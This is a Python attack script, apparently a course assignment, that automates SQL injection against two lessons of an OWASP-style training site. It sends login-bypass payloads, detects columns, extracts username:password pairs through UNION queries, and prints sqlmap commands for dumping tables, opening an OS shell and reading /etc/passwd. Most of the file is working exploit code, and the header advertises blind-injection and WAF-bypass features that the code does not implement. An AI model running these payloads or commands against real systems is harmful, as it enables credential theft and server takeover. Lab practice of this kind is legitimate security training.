#!/usr/bin/env python3
"""
MODUL 2: THREAT MODELLING - SQL INJECTION ADVANCED + SQLMAP
===========================================================
Tugas: Eksploitasi SQL Injection pada:
- Lesson 01: Login form injection
- Lesson 03: URL parameter injection

Fitur:
✅ Manual injection dengan auto detection
✅ SQLMap integration untuk automated exploitation
✅ Time/Boolean blind injection
✅ Union-based data extraction
✅ WAF bypass techniques
"""

import requests
import subprocess
import re
import time
import os
import sys
import json
import urllib3
import threading
import queue
import random
from bs4 import BeautifulSoup
from datetime import datetime
from urllib.parse import quote, urljoin

# Nonaktifkan SSL warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Tambahkan path module
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))

# Import modules dengan error handling
MODULES_AVAILABLE = True
try:
    from modules.payload_generator import PayloadGenerator
    from modules.result_saver import ResultSaver
    from modules.logger import get_logger
except ImportError as e:
    print(f"⚠️ Modules not available: {e}")
    MODULES_AVAILABLE = False

# Fallback colorama
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    HAS_COLOR = True
except ImportError:
    HAS_COLOR = False
    class Fore:
        RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = ''
    class Style:
        BRIGHT = ''


class SQLInjectionAdvanced:
    """SQL Injection Auto-Exploitation dengan SQLMap Integration"""
    
    def __init__(self):
        # TARGET SESUAI TUGAS
        self.targets = {
            'lesson1': {
                'url': 'https://target.rootbrain.com/owasp/injection/lessons/lesson01/index.php',
                'type': 'form',
                'method': 'POST',
                'params': ['username', 'password'],
                'description': 'Login Form Injection'
            },
            'lesson3': {
                'url': 'https://target.rootbrain.com/owasp/injection/lessons/lesson03/index.php',
                'type': 'get',
                'method': 'GET',
                'params': ['id'],
                'description': 'URL Parameter Injection'
            }
        }
        
        self.results = {
            'vulnerabilities': [],
            'manual_tests': {},
            'sqlmap_commands': [],
            'timestamp': datetime.now().isoformat()
        }
        
        # Setup session
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
        
        # Setup paths
        self.project_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        self.results_dir = os.path.join(self.project_dir, 'results', 'sql_injection')
        self.logs_dir = os.path.join(self.project_dir, 'logs')
        os.makedirs(self.results_dir, exist_ok=True)
        os.makedirs(self.logs_dir, exist_ok=True)
        
        # Log file
        self.log_file = os.path.join(self.logs_dir, f'sql_advanced_{datetime.now().strftime("%Y%m%d")}.log')
    
    # ========== UTILITY FUNCTIONS ==========
    
    def log(self, message, level='INFO'):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] [{level}] {message}\n"
        if HAS_COLOR:
            if level == 'ERROR':
                print(f"{Fore.RED}{message}{Style.RESET_ALL}")
            elif level == 'SUCCESS':
                print(f"{Fore.GREEN}{message}{Style.RESET_ALL}")
            elif level == 'WARNING':
                print(f"{Fore.YELLOW}{message}{Style.RESET_ALL}")
            else:
                print(message)
        else:
            print(message)
        try:
            with open(self.log_file, 'a') as f:
                f.write(log_entry)
        except:
            pass
    
    def print_section(self, title):
        print("\n" + "="*70)
        print(f"  {title}")
        print("="*70)
    
    def print_success(self, msg):
        if HAS_COLOR:
            print(f"{Fore.GREEN}  ✅ {msg}{Style.RESET_ALL}")
        else:
            print(f"  ✅ {msg}")
    
    def print_info(self, msg):
        if HAS_COLOR:
            print(f"{Fore.CYAN}  ℹ️ {msg}{Style.RESET_ALL}")
        else:
            print(f"  ℹ️ {msg}")
    
    def print_warning(self, msg):
        if HAS_COLOR:
            print(f"{Fore.YELLOW}  ⚠️ {msg}{Style.RESET_ALL}")
        else:
            print(f"  ⚠️ {msg}")
    
    # ========== MANUAL INJECTION TECHNIQUES ==========
    
    def test_lesson1_basic(self, url):
        """Test basic SQL injection untuk Lesson 1"""
        self.print_info("Testing basic SQL injection on login form...")
        
        payloads = [
            ("admin' --", "Bypass with comment"),
            ("' OR '1'='1", "OR condition true"),
            ("admin'/*", "Multi-line comment"),
            ("' OR 1=1--", "OR with number"),
        ]
        
        for payload, desc in payloads:
            data = {
                'username': payload,
                'password': 'anything',
                'submit': 'Login'
            }
            
            try:
                response = self.session.post(url, data=data, timeout=5)
                
                if "Welcome" in response.text or "Success" in response.text:
                    self.print_success(f"VULNERABLE! Payload: {payload}")
                    return {'success': True, 'payload': payload, 'description': desc}
                elif "error" not in response.text.lower():
                    self.print_info(f"Possible success: {payload}")
            except Exception as e:
                self.log(f"Error testing {payload}: {e}", 'ERROR')
        
        return {'success': False}
    
    def test_lesson3_basic(self, base_url, param='id'):
        """Test basic SQL injection untuk Lesson 3"""
        self.print_info("Testing parameter injection...")
        
        results = []
        payloads = [
            ("'", "Single quote"),
            ("' OR '1'='1", "OR condition"),
            ("' ORDER BY 1--", "Order by test"),
            ("' UNION SELECT NULL--", "Union test"),
        ]
        
        for payload, desc in payloads:
            test_url = f"{base_url}?{param}=1{payload}"
            try:
                response = self.session.get(test_url, timeout=5)
                
                if "error" in response.text.lower() or "mysql" in response.text.lower():
                    self.print_success(f"Error-based possible: {payload}")
                    results.append({'payload': payload, 'description': desc, 'type': 'error'})
                elif "2" in response.text or "3" in response.text:
                    self.print_success(f"Data appears: {payload}")
                    results.append({'payload': payload, 'description': desc, 'type': 'data'})
            except Exception as e:
                self.log(f"Error: {e}", 'ERROR')
        
        return results
    
    def detect_columns(self, url, param='id'):
        """Deteksi jumlah kolom menggunakan ORDER BY"""
        self.print_info("Detecting number of columns...")
        
        for i in range(1, 11):
            payload = f"' ORDER BY {i}--"
            test_url = url.replace(f'{param}=1', f'{param}=1{payload}')
            
            try:
                response = self.session.get(test_url, timeout=5)
                if "error" in response.text.lower():
                    self.print_success(f"Found {i-1} columns")
                    return i-1
            except:
                continue
        
        return 4  # Default
    
    def find_visible_columns(self, url, num_columns, param='id'):
        """Cari kolom yang visible"""
        self.print_info("Finding visible columns...")
        
        visible = []
        for i in range(1, num_columns + 1):
            nulls = ['NULL'] * num_columns
            nulls[i-1] = f"'{i}'"
            payload = f"' UNION SELECT {','.join(nulls)}--"
            test_url = url.replace(f'{param}=1', f'{param}=1{payload}')
            
            try:
                response = self.session.get(test_url, timeout=5)
                if str(i) in response.text:
                    visible.append(i)
                    self.print_success(f"Column {i} is visible")
            except:
                continue
        
        return visible if visible else [1]
    
    def extract_users(self, url, num_columns, visible_columns, param='id'):
        """Ekstrak data users"""
        self.print_info("Extracting user data...")
        
        users = []
        queries = [
            "SELECT GROUP_CONCAT(username,':',password) FROM users",
            "SELECT CONCAT(username,':',password) FROM users LIMIT 1"
        ]
        
        for query in queries:
            nulls = ['NULL'] * num_columns
            for col in visible_columns[:1]:
                nulls[col-1] = query
            
            payload = f"' UNION SELECT {','.join(nulls)}--"
            test_url = url.replace(f'{param}=1', f'{param}=1{payload}')
            
            try:
                response = self.session.get(test_url, timeout=5)
                soup = BeautifulSoup(response.text, 'html.parser')
                text = soup.get_text()
                
                # Pattern untuk user:pass
                import re
                matches = re.findall(r'([a-zA-Z0-9_]+):([a-fA-F0-9]{32,}|[a-zA-Z0-9!@#$%^&*]+)', text)
                
                for user, pwd in matches:
                    if len(user) > 2 and len(pwd) > 2:
                        users.append({'username': user, 'password': pwd})
                        self.print_success(f"Found: {user}:{pwd[:10]}...")
            except:
                continue
        
        return users
    
    # ========== SQLMAP INTEGRATION ==========
    
    def check_sqlmap(self):
        """Cek apakah sqlmap tersedia"""
        try:
            result = subprocess.run(['sqlmap', '--version'], 
                                   capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                version = result.stdout.split('\n')[0]
                self.print_success(f"SQLMap tersedia: {version}")
                return True
        except:
            pass
        self.print_warning("SQLMap tidak ditemukan. Install: sudo apt install sqlmap")
        return False
    
    def generate_sqlmap_commands(self):
        """Generate perintah SQLMap untuk dieksekusi manual"""
        self.print_section("SQLMAP COMMANDS")
        self.print_info("Copy & paste perintah berikut untuk eksekusi manual:")
        
        commands = []
        
        # Lesson 1 commands
        target1 = self.targets['lesson1']
        print(f"\n{Fore.CYAN}📌 LESSON 1 - LOGIN FORM:{Style.RESET_ALL}")
        
        cmd1_db = f"sqlmap -u '{target1['url']}' --data='username=admin&password=test&submit=Login' --level=3 --risk=3 --batch --dbs"
        print(f"   [1] Database enumeration:\n   {cmd1_db}")
        commands.append(cmd1_db)
        
        cmd1_tables = f"sqlmap -u '{target1['url']}' --data='username=admin&password=test&submit=Login' -D database_name --tables --batch"
        print(f"\n   [2] Table enumeration:\n   {cmd1_tables}")
        commands.append(cmd1_tables)
        
        cmd1_dump = f"sqlmap -u '{target1['url']}' --data='username=admin&password=test&submit=Login' -D database_name -T users --dump --batch"
        print(f"\n   [3] Dump users table:\n   {cmd1_dump}")
        commands.append(cmd1_dump)
        
        # Lesson 3 commands
        target3 = self.targets['lesson3']
        print(f"\n{Fore.CYAN}📌 LESSON 3 - URL PARAMETER:{Style.RESET_ALL}")
        
        cmd3_db = f"sqlmap -u '{target3['url']}?id=1' --level=3 --risk=3 --batch --dbs"
        print(f"   [1] Database enumeration:\n   {cmd3_db}")
        commands.append(cmd3_db)
        
        cmd3_tables = f"sqlmap -u '{target3['url']}?id=1' -D database_name --tables --batch"
        print(f"\n   [2] Table enumeration:\n   {cmd3_tables}")
        commands.append(cmd3_tables)
        
        cmd3_dump = f"sqlmap -u '{target3['url']}?id=1' -D database_name -T users --dump --batch"
        print(f"\n   [3] Dump users table:\n   {cmd3_dump}")
        commands.append(cmd3_dump)
        
        # Advanced options
        print(f"\n{Fore.CYAN}📌 ADVANCED OPTIONS:{Style.RESET_ALL}")
        cmd_os = f"sqlmap -u '{target3['url']}?id=1' --os-shell --batch"
        print(f"   • OS Shell: {cmd_os}")
        commands.append(cmd_os)
        
        cmd_file = f"sqlmap -u '{target3['url']}?id=1' --file-read=/etc/passwd"
        print(f"   • Read file: {cmd_file}")
        commands.append(cmd_file)
        
        return commands
    
    def save_sqlmap_commands(self, commands):
        """Simpan perintah SQLMap ke file"""
        cmd_file = os.path.join(self.results_dir, f'sqlmap_commands_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt')
        with open(cmd_file, 'w') as f:
            f.write("SQLMAP COMMANDS - TUGAS MODUL 2\n")
            f.write("="*60 + "\n\n")
            for i, cmd in enumerate(commands, 1):
                f.write(f"[{i}] {cmd}\n\n")
        self.print_success(f"SQLMap commands saved: {cmd_file}")
    
    # ========== MAIN EXECUTION ==========
    
    def run(self):
        """Main execution"""
        self.print_section("SQL INJECTION ADVANCED + SQLMAP")
        print(f"Waktu: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Target: Lesson 1 (Form) & Lesson 3 (URL)")
        
        all_results = {}
        
        # ===== LESSON 1 =====
        self.print_section("LESSON 1 - LOGIN FORM INJECTION")
        
        target1 = self.targets['lesson1']
        result1 = self.test_lesson1_basic(target1['url'])
        all_results['lesson1'] = result1
        
        if result1.get('success'):
            self.print_success("✅ LESSON 1: VULNERABLE!")
            print(f"   Payload: {result1.get('payload')}")
            print(f"   Technique: {result1.get('description')}")
        else:
            self.print_warning("⚠️ LESSON 1: Not vulnerable with basic tests")
        
        # ===== LESSON 3 =====
        self.print_section("LESSON 3 - URL PARAMETER INJECTION")
        
        target3 = self.targets['lesson3']
        
        # Manual tests
        results3 = self.test_lesson3_basic(target3['url'], 'id')
        
        # Advanced detection
        num_columns = self.detect_columns(target3['url'], 'id')
        print(f"   Columns detected: {num_columns}")
        
        visible = self.find_visible_columns(target3['url'], num_columns, 'id')
        print(f"   Visible columns: {visible}")
        
        # Extract users
        users = self.extract_users(target3['url'], num_columns, visible, 'id')
        
        all_results['lesson3'] = {
            'num_columns': num_columns,
            'visible_columns': visible,
            'tests': results3,
            'users': users
        }
        
        if users:
            self.print_success(f"✅ LESSON 3: VULNERABLE! Found {len(users)} users")
        elif results3:
            self.print_success("✅ LESSON 3: VULNERABLE! (injection possible)")
        else:
            self.print_warning("⚠️ LESSON 3: Not vulnerable with basic tests")
        
        # ===== SQLMAP INTEGRATION =====
        self.print_section("SQLMAP AUTOMATION")
        
        sqlmap_available = self.check_sqlmap()
        commands = self.generate_sqlmap_commands()
        self.save_sqlmap_commands(commands)
        
        all_results['sqlmap'] = {
            'available': sqlmap_available,
            'commands': commands[:3]  # Simpan 3 command pertama
        }
        
        # ===== SUMMARY =====
        self.print_section("SUMMARY")
        
        if all_results['lesson1'].get('success'):
            print(f"{Fore.GREEN}✓ Lesson 1: VULNERABLE (manual){Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}⚠ Lesson 1: Tested{Style.RESET_ALL}")
        
        if all_results['lesson3'].get('users'):
            print(f"{Fore.GREEN}✓ Lesson 3: VULNERABLE ({len(users)} users){Style.RESET_ALL}")
        elif all_results['lesson3'].get('tests'):
            print(f"{Fore.GREEN}✓ Lesson 3: VULNERABLE (injection possible){Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}⚠ Lesson 3: Tested{Style.RESET_ALL}")
        
        if sqlmap_available:
            print(f"{Fore.GREEN}✓ SQLMap: Available{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}⚠ SQLMap: Not installed{Style.RESET_ALL}")
        
        # ===== SAVE RESULTS =====
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        json_file = os.path.join(self.results_dir, f'results_{timestamp}.json')
        with open(json_file, 'w') as f:
            json.dump(all_results, f, indent=4)
        print(f"\n✓ JSON saved: {json_file}")
        
        print(f"\n{Fore.CYAN}📁 Hasil tersimpan di: results/sql_injection/{Style.RESET_ALL}")
        print(f"{Fore.CYAN}📝 SQLMap commands: sqlmap_commands_{timestamp}.txt{Style.RESET_ALL}")
        
        self.print_section("EXECUTION COMPLETE")
        
        return all_results


if __name__ == "__main__":
    injector = SQLInjectionAdvanced()
    injector.run()